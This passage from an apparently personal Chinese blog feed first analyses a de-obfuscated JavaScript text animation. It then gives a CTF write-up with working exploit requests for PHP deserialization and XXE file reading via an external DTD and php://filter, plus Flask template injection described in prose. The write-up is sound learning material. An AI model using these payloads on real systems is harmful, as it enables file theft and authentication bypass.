class="number">-1</span>),a.skillP--):(a.skillI=(a.skillI+<span class="number">1</span>)%h.length,a.direction=<span class="string">"forward"</span>));e.textContent=a.text;e.appendChild(m(a.prefixP&lt;b.length?<span class="built_in">Math</span>.min(c,c+a.prefixP):<span class="built_in">Math</span>.min(c,d.length-a.skillP)));setTimeout(g,n)&#125;<span class="keyword">var</span> b=<span class="string">""</span>,h=<span class="string">"\u9752\u9752\u9675\u4e0a\u67cf\uff0c\u78ca\u78ca\u6da7\u4e2d\u77f3\u3002 \u4eba\u751f\u5929\u5730\u95f4\uff0c\u5ffd\u5982\u8fdc\u884c\u5ba2\u3002 \u6597\u9152\u76f8\u5a31\u4e50\uff0c\u804a\u539a\u4e0d\u4e3a\u8584\u3002 \u9a71\u8f66\u7b56\u9a7d\u9a6c\uff0c\u6e38\u620f\u5b9b\u4e0e\u6d1b\u3002 \u6d1b\u4e2d\u4f55\u90c1\u90c1\uff0c\u51a0\u5e26\u81ea\u76f8\u7d22\u3002 \u957f\u8862\u7f57\u5939\u5df7\uff0c\u738b\u4faf\u591a\u7b2c\u5b85\u3002 \u4e24\u5bab\u9065\u76f8\u671b\uff0c\u53cc\u9619\u767e\u4f59\u5c3a\u3002 \u6781\u5bb4\u5a31\u5fc3\u610f\uff0c\u621a\u621a\u4f55\u6240\u8feb\uff1f"</span>.split(<span class="string">" "</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">return</span> a+</span></span><br><span class="line"><span class="javascript"><span class="string">""</span>&#125;),l=<span class="number">2</span>,k=<span class="number">1</span>,c=<span class="number">5</span>,n=<span class="number">75</span>,f=<span class="string">"rgb(110,64,170) rgb(150,61,179) rgb(191,60,175) rgb(228,65,157) rgb(254,75,131) rgb(255,94,99) rgb(255,120,71) rgb(251,150,51) rgb(226,183,47) rgb(198,214,60) rgb(175,240,91) rgb(127,246,88) rgb(82,246,103) rgb(48,239,130) rgb(29,223,163) rgb(26,199,194) rgb(35,171,216) rgb(54,140,225) rgb(76,110,219) rgb(96,84,200)"</span>.split(<span class="string">" "</span>),a=&#123;<span class="attr">text</span>:<span class="string">""</span>,<span class="attr">prefixP</span>:-c,<span class="attr">skillI</span>:<span class="number">0</span>,<span class="attr">skillP</span>:<span class="number">0</span>,<span class="attr">direction</span>:<span class="string">"forward"</span>,<span class="attr">delay</span>:l,<span class="attr">step</span>:k&#125;;g()&#125;;binft(<span class="built_in">document</span>.getElementById(<span class="string">'binft'</span>));</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 js 的部分经历了压缩，随便找了个在线解压工具尝试格式化后，终于获得了一份勉强能看的代码。而由于最近刚刚了解了 js 混淆的含义与作用，这份代码又刚好经过了不太难的混淆处理，故准备拿它开刀，尝试自己分析一下。</p><h1 id="0x1-相关问题"><a href="#0x1-相关问题" class="headerlink" title="0x1 相关问题"></a>0x1 相关问题</h1><h2 id="0x10-恼人的条件表达式"><a href="#0x10-恼人的条件表达式" class="headerlink" title="0x10 恼人的条件表达式"></a>0x10 恼人的条件表达式</h2><p>首先比较麻烦的就是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.step ? a.step--:(a.step = k, a.prefixP &lt; b.length ? (<span class="number">0</span> &lt;= a.prefixP &amp;&amp; (a.text += b[a.prefixP]), a.prefixP++) : <span class="string">"forward"</span> === a.direction ? a.skillP &lt; d.length ? (a.text += d[a.skillP], a.skillP++) : a.delay ? a.delay--:(a.direction = <span class="string">"backward"</span>, a.delay = l) : <span class="number">0</span> &lt; a.skillP ? (a.text = a.text.slice(<span class="number">0</span>, <span class="number">-1</span>), a.skillP--) : (a.skillI = (a.skillI + <span class="number">1</span>) % h.length, a.direction = <span class="string">"forward"</span>))</span><br></pre></td></tr></table></figure><p>这一坨迷之表达式了，对我而言非常有必要将其转换成普通的 if-else 语句，于是尝试 STFW 后得到如下三只：</p><ul><li><a href="https://opengg.github.io/babel-plugin-transform-ternary-to-if-else/" target="_blank" rel="noopener">OpenGG 的 转换工具(会转成 IIFE)</a></li><li><a href="https://raybb.github.io/ternary-converter/" target="_blank" rel="noopener">raybb 的 转换工具(需要用空格分隔关键字)</a></li><li><a href="converter.website-dev.eu">website-dev.eu 的转换工具(需要科学上网，或手动换源)</a></li></ul><p>然而如上所述，三位前辈的工具都有着各自的问题，先抛开 IIFE 的可读性不说，后面两只并没有支持诸如  <code>1?(2?3:4,3?4:5):6</code> 这样的平行语句，因此并不能处理上面的表达式，考虑到未来可能还会有类似的需求，故以解决上述情况为主要目标，掏出 Python 一顿乱敲产出了如下脚本（TL;DR）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引号中输入想要处理的内容</span></span><br><span class="line">tmp = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预处理 删除所有空格 方便后面判断左右是否有括号</span></span><br><span class="line">tmp = tmp.replace(<span class="string">' '</span>, <span class="string">''</span>)</span><br><span class="line"><span class="comment"># 将一组语句在考虑括号的前提下以逗号再分组</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSplitContent</span><span class="params">(tmp)</span>:</span></span><br><span class="line">balance = <span class="number">0</span></span><br><span class="line">indexs = []</span><br><span class="line">words = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp)):</span><br><span class="line"><span class="keyword">if</span> tmp[i] == <span class="string">'('</span>:</span><br><span class="line">balance += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> tmp[i] == <span class="string">')'</span>:</span><br><span class="line">balance -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> tmp[i]==<span class="string">','</span> <span class="keyword">and</span> balance==<span class="number">0</span>:</span><br><span class="line">indexs.append(i)</span><br><span class="line"><span class="comment"># 手动切分 因为 str 是不可变对象 暂时没有好办法</span></span><br><span class="line">i = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> indexs:</span><br><span class="line">words.append(tmp[i+<span class="number">1</span>:j])</span><br><span class="line">i = j</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">words.append(tmp[i+<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得 tmp 中和 ? 匹配的 : 符号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIndex</span><span class="params">(tmp)</span>:</span></span><br><span class="line">balance = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp)):</span><br><span class="line"><span class="keyword">if</span> tmp[i] == <span class="string">'?'</span>:</span><br><span class="line">balance += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> tmp[i] == <span class="string">':'</span>:</span><br><span class="line">balance -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> balance == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(input, n=<span class="number">0</span>)</span>:</span></span><br><span class="line"><span class="keyword">if</span> input.startswith(<span class="string">'('</span>) <span class="keyword">and</span> input.endswith(<span class="string">')'</span>):</span><br><span class="line">input = input[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">tab = <span class="string">'  '</span>*n</span><br><span class="line">splitTmp = getSplitContent(input)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tmp <span class="keyword">in</span> splitTmp:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 没找到则说明当前语句不可再分</span></span><br><span class="line">left = tmp.find(<span class="string">'?'</span>)</span><br><span class="line"><span class="keyword">if</span> left == <span class="number">-1</span>:</span><br><span class="line">print(<span class="string">"%s%s;"</span>%(tab, tmp))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 没找到则说明条件表达式不完整</span></span><br><span class="line">right = getIndex(tmp)</span><br><span class="line"><span class="keyword">if</span> right == <span class="number">-1</span>:</span><br><span class="line">print(<span class="string">"Error"</span>)</span><br><span class="line">exit()</span><br><span class="line"><span class="comment"># 打印当前层的 if-else 语句并递归处理子句</span></span><br><span class="line">print(<span class="string">"%sif (%s) &#123;"</span>%(tab, tmp[:left]))</span><br><span class="line"></span><br><span class="line">fun(tmp[left+<span class="number">1</span>:right], n+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'%s&#125; else &#123;'</span>%tab)</span><br><span class="line"></span><br><span class="line">fun(tmp[right+<span class="number">1</span>:], n+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'%s&#125;'</span>%tab)</span><br><span class="line"></span><br><span class="line">fun(tmp)</span><br></pre></td></tr></table></figure><p>主要思路比较简单，就是以括号为基准挑选出可作为分隔符的逗号，并以此对语句进行分组后再递归处理，唯一比较坑的地方是 python 中 str 属于不可变对象，因此这里只好采用记录下标并手动拆分的办法= =</p><p>同时，受上面前辈的启发，觉得可以在博客里开个 <a href="/tools/">杂项</a> 的板块，里面放一些小脚本等与博客本身没什么关系的东西，这样既方便日后的使用，也可以作为一种练习，嗯，可喜可贺。</p><p>把上面的一坨表达式丢进脚本里，再用运行后的结果替换之，可以发现这个名为 <strong>g</strong> 的函数就是逻辑的主要部分了。</p><h2 id="0x11-setTimeout-以及-js-事件循环机制"><a href="#0x11-setTimeout-以及-js-事件循环机制" class="headerlink" title="0x11 setTimeout 以及 js 事件循环机制"></a>0x11 setTimeout 以及 js 事件循环机制</h2><p>结束替换的工作后，就可以开始读代码了。考虑到实际的效果，能够猜到代码里包含着类似循环的部分，可是尝试搜索 for 和 while 时都没有找到任何内容。在仔细阅读后，终于发现在上面转换出来的 g 函数里静静地躺着一只 <code>setTimeout(g, n)</code> ，想来它就是我们的目标了。</p><p>可是很奇怪，之前在 w某school 和 某鸟 中了解到该函数只是设置一个表达式在多少毫秒后执行（因为没有实际用过我一直以为是像 sleep 一样的东西），那么如果把它放在这个地方，为什么不会因为无限递归而爆栈呢？</p><p>继续 STFW 后，终于得到<a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">答案</a>，这里为了方便日后回忆以及防止链接挂掉，简单地总结一下：</p><ul><li><p>首先要明确的，是 js 本身是一个 <strong>单线程</strong> 的语言，但是为了更好地处理网页中日渐庞大的静态资源，其提供了 同步任务 和 异步任务 两种机制。在实际执行时，同步任务进入主线程，而异步任务进入 EventTable 并注册回调函数，在指定的事情完成后，EventTable 会将这个函数移入 EventQueue；当 js 的 monitoring process 进程发现主线程空栈后就会去 EventQueue 中读取对应的函数并执行，这个过程一直持续到所有的任务被完成。</p></li><li><p>而除了广义的 同步 与 异步，在精细定义下任务还可以被分成 宏任务(macro-task) 和 微任务(micro-task) ，前者包括整体代码，setTimeout，setInterval，后者包括 Promise，process.nextTick 等等；不同的任务在执行时会以这两种任务为基准进入对应的 EventQueue ，并交替运行直至所有任务被完成。</p></li><li><p>而 setTimeout 函数中用来表示时间的参数，实际上指的是经过多少毫秒后将任务从 EventTable 转移到宏任务的 EventQueue 中，所以影响实际时间的因素其实还挺多的，完全不是 w某school 和 某鸟 中说的那样= =</p></li></ul><p>据说这一点在前端的面试题中屡见不鲜，以后有时间可以找一找相关的内容。</p><p>回到正题，由于这里把函数调用放到了所有语句的最后，所以时间上基本没什么偏差；而之所以以这种方式实现，是因为 js 本事是单线程的语言，所以如果这里以普通循环来实现的话会让其他的任务卡住，看来 <strong>这里异步的递归就是循环</strong> 呀，嗯，学到了。</p><h2 id="0x12-createDocumentFragment-的含义"><a href="#0x12-createDocumentFragment-的含义" class="headerlink" title="0x12 createDocumentFragment 的含义"></a>0x12 createDocumentFragment 的含义</h2><p>从最终效果来看，这是一个不断更新文档元素的过程，通过查看代码可以发现，实际负责插入随机字符的是名为 m 的这个函数，注意到在其 for 循环中，有着名为 createDocumentFragment 的函数调用，这就又触及到我的盲区了，遂继续<a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/createDocumentFragment" target="_blank" rel="noopener">求助网络</a>，得知该函数可以很好地工作在频繁更新元素的环境下。</p><h1 id="0x2-结语"><a href="#0x2-结语" class="headerlink" title="0x2 结语"></a>0x2 结语</h1><p>做好上述准备后，就可以安心地读代码了。其本身并没有什么难度，在去掉了用来混淆的无关代码以及对变量和函数进行语义化后就得到了当前页面中使用的 js 代码了。有兴趣的朋友们可以看一下～</p><script>// 作为 web 坑的新人，非常渴望找到一个可以交流技术或可以一起合作写项目的个人或// 团体，如果您对此有兴趣的话，非常欢迎通过右侧的联系方式与我交流～    (()=>{        let div = document.querySelector('#yuren-content');        let sequences = ["一二三四五，上山打老虎。", "老虎没打到，打到小松鼠。"];        let colors = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"];        function getOneColor() {            return colors[Math.floor(Math.random()*colors.length)];        }        function getSomeChar(r) {            let n=document.createDocumentFragment();            for (let i=0; i<r; ++i) {                let l = document.createElement('span');                l.textContent = String.fromCharCode(33+94*Math.random());                l.style.color = getOneColor();                n.appendChild(l);            }            return n;        }        let tmp = "";        let index = 0;        let which = 0;        let delay = 2;        let stop = true;        let direction = "forward";        function run() {            let seq = sequences[which];            if (stop) {                stop = false;            } else {                stop = true;                if (direction === "forward") {                    if (index < seq.length) {                        tmp += seq[index];                        ++index;                    } else {                        if (delay) {                            --delay;                        } else {                            direction = 'backward';                            delay = 2;                        }                    }                } else {                    if (index > 0) {                        tmp = tmp.slice(0, -1);                        --index;                    } else {                        which = (which+1)%sequences.length;                        direction = 'forward';                    }                }            }            div.textContent = tmp;            div.appendChild(getSomeChar(Math.min(5, seq.length-index)));            setTimeout(run, 75);        }        run();    })();</script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NEXCTF 招新赛 WirteUP</title>
      <link href="/2019/11/20/NEXCTF-WriteUp/"/>
      <url>/2019/11/20/NEXCTF-WriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>本文是上个月学校 NEX 战队招新赛中部分题目的 WriteUP ，因为赛事从结果上来说还是很令人高兴的，所以一直都想单独写一篇博客来记录这些题目，但是因为学校的一堆事情+拖延症的问题，差不多过了1个月才着手做这件事…</p><h1 id="0x1-相关环境"><a href="#0x1-相关环境" class="headerlink" title="0x1 相关环境"></a>0x1 相关环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python v3.7.4</span><br><span class="line">requests v2.22.0</span><br><span class="line">Flask v1.1.1</span><br><span class="line">Binwalk v2.1.1</span><br><span class="line">dd</span><br></pre></td></tr></table></figure><h1 id="0x2-各WriteUP"><a href="#0x2-各WriteUP" class="headerlink" title="0x2 各WriteUP"></a>0x2 各WriteUP</h1><h2 id="0x20-Web-签到"><a href="#0x20-Web-签到" class="headerlink" title="0x20 Web 签到"></a>0x20 Web 签到</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ttt</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'get'</span>] === <span class="string">'1'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'post'</span>] === <span class="string">'1'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>] === <span class="string">'127.0.0.1'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           unserialize($_POST[<span class="string">'class'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码如上，分析知 ttt 类的析构函数会输出 flag 内容，而代码中存在 <a href="https://www.php.net/manual/zh/function.unserialize.php" target="_blank" rel="noopener">unserialize</a> 函数，故可知该代码存在<a href="https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/" target="_blank" rel="noopener">反序列化漏洞</a>。下面来构造 ttt 类的序列化内容，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ttt</span> </span>&#123;&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ttt);</span><br></pre></td></tr></table></figure><p>那么现在解决问题的关键就是构造满足三个 if 条件的请求，以使程序流程到达反序列化函数那里。get 和 post 都是常规的请求，这里可以了解一下 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For" target="_blank" rel="noopener">X-Forwarded-For</a> ，然后可通过 Python3+Requests 构造如下请求来获取  flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">'requests'</span>).post(<span class="string">'http://&lt;ip&gt;:&lt;port&gt;/?get=1'</span>, data=&#123;<span class="string">'post'</span>:<span class="string">'1'</span>,<span class="string">'class'</span>:<span class="string">'O:3:"ttt":0:&#123;&#125;'</span>&#125;, headers=&#123;<span class="string">'X-Forwarded-For'</span>:<span class="string">'127.0.0.1'</span>&#125;).content</span><br></pre></td></tr></table></figure><h2 id="0x21-Baby-Flask"><a href="#0x21-Baby-Flask" class="headerlink" title="0x21 Baby Flask"></a>0x21 Baby Flask</h2><p><a href="https://pan.baidu.com/s/1uAlyfJY63h05kG9LmGQQTg" target="_blank" rel="noopener">源码</a> 提取码: upiv</p><p>可以看到，路由 /admin 可以获取到 Flag ，该视图函数通过验证 session 中 admin 的值来返还不同的内容；而因为 Flask 是<a href="https://www.secpulse.com/archives/97707.html" target="_blank" rel="noopener">客户端session</a>的模式，故这个值可以人为修改。</p><p>那么解题的目标就变成了通过寻找注入点来获取 secretkey ，查看代码知调用 render_template_string 函数时第一个参数传递了 template.replace，将 模版中的 $remembered_name 替换成了 session 中 name 的值，通过查看 index.html 可知该占位符出现在 Info 模块和 Author 输入框的 value 属性中，故可通过合理控制 Author 中的值来实现注入。</p><p>而在 app.py 中，通过定义 safe_input 函数针对 post 过来的输入进行了过滤，查看代码可知输入中不能出现 ()[]_ 这几种字符，所以可以通过全局变量 config 来获取secretkey。</p><p>拿到key以后，通过构造 session ，并使用浏览器自带的开发者工具将原来的值替换掉即可通过访问 /admin 拿到 Flag。</p><h2 id="0x22-Baby-xxe"><a href="#0x22-Baby-xxe" class="headerlink" title="0x22 Baby xxe"></a>0x22 Baby xxe</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = $_POST[<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($xmlfile)) &#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (stristr($xmlfile, <span class="string">"xml"</span>)) &#123;</span><br><span class="line">$xmlfile = str_ireplace(<span class="string">"&lt;!entity"</span>, <span class="string">"nonono"</span>, $xmlfile);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$xmlfile = <span class="string">'&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="string">&lt;!ENTITY all "'</span>.$xmlfile.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;all;&lt;/root&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT|LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line"><span class="keyword">echo</span> ($creds);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>提示信息：Flag 在 ./flag.php 中</strong></p><p>尝试直接访问 flag.php 发现内容为 flag{f4ke_fl4g} ，也就是假 Flag ；那么根据提示来分析，很有可能真正的 Flag 被写在 php 代码的注释中或是有 if 条件来限制，所以首要的目标是拿到 flag.php 的代码。</p><p>通过分析上面的代码，可以发现 else 中 xmlfile 被双引号扩住，所以不能通过写入 SYSTEM 关键字来达到 xxe 的效果，而 else if 中只要出现 xml 字样就会替换 entity 关键字，但没有进一步的过滤措施，故可以通过载入 dtd 的方式实现注入。</p><p><strong>题目本身是放在服务器上的，故想要访问自定义的 dtd 文件需要具备公网 ip 的设备，这里的复现因为在本地，就不做相关处理了</strong>。假设文件名为 tmp.dtd ，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot;&gt;</span><br></pre></td></tr></table></figure><p>这里要注意的是，由于最后 php 解析的是 xml 内容，而 flag.php 代码中存在诸如 &lt;&gt; 的符号，会对解析造成干扰，故采用 php 伪协议将文件内容以 base64 进行编码。</p><p>然后通过 Python+Requests 发送如下 POST 请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"requests"</span>).post(<span class="string">"http://&lt;ip&gt;:&lt;port&gt;/&lt;题目文件名&gt;"</span>, data=&#123;<span class="string">"name"</span>:<span class="string">'&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root SYSTEM "tmp.dtd"&gt;&lt;root&gt;&amp;test;&lt;/root&gt;'</span>&#125;).content</span><br></pre></td></tr></table></figure><p>将得到的 base64 内容解码即可得到 php 代码，经过相关处理得到 Flag。</p><h2 id="0x23-ScriptBoy"><a href="#0x23-ScriptBoy" class="headerlink" title="0x23 ScriptBoy"></a>0x23 ScriptBoy</h2><p><a href="https://pan.baidu.com/s/1PtDSpJT8eXlDjw6voKYaig" target="_blank" rel="noopener">文件包</a> 提取码: gxfa</p><p><strong>题目描述：筛选出所有文件中前两个数字都是4位的一行，将选出的每一行的第20位组成一个字符串， flag就是这个字符串的32位小写MD5的值</strong></p><p>分析文件结构后可以用如下脚本构造 Flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">filename = <span class="string">"./"</span>+str(i)+<span class="string">"/"</span>+str(i)+<span class="string">".txt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">content = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tmp <span class="keyword">in</span> content:</span><br><span class="line">split_tmp = tmp.split(<span class="string">'----'</span>)</span><br><span class="line"><span class="keyword">if</span> len(split_tmp[<span class="number">0</span>])==len(split_tmp[<span class="number">1</span>])==<span class="number">4</span>:</span><br><span class="line">result.append(tmp[<span class="number">19</span>])</span><br><span class="line"></span><br><span class="line">print(md5(<span class="string">''</span>.join(result).encode(<span class="string">'utf8'</span>)).hexdigest())</span><br></pre></td></tr></table></figure><h2 id="0x24-ljmisc"><a href="#0x24-ljmisc" class="headerlink" title="0x24 ljmisc"></a>0x24 ljmisc</h2><p><a href="https://pan.baidu.com/s/1IJ_pA4EL53YvZChEyXsFwQ" target="_blank" rel="noopener">图片</a> 提取码: mnck</p><p>⬆️打开链接前请做好心理准备</p><p>拿到图片后，执行 <code>binwalk 1000.png</code> 即可发现从 0x8B3F4 处开始隐藏了一个压缩包，故可执行 <code>dd if=1000.png of=test.zip skip=0x8b3f4 bs=1</code> 来将它提取出来。据说这个包经过了伪加密，但是当时因为环境是 MacOS ，所以也没有经历解密的操作，这里也就先不记录相关内容了。</p><p>打开后出现一个新的压缩包和两张图片，新的压缩包是真的被加密过的，所以要从另外两张图片寻找解压密码的线索。</p><p>两张图片并不能看出什么分别，但是大小却差了很多，故可以猜测是盲水印。</p><p>使用<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">bwm</a>处理后可以获得解压密码为 glgjssy_qyhfbqz，输入后即可打开压缩包到达第三层。</p><p>解压后的文件是一个充满0和1的文件，当时看了好久都没什么头绪。但是在我万能的舍友的帮助下，猜测这可能是描述了一张二维码，故通过以下脚本将1的位置填充为黑，0的位置填充为白：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 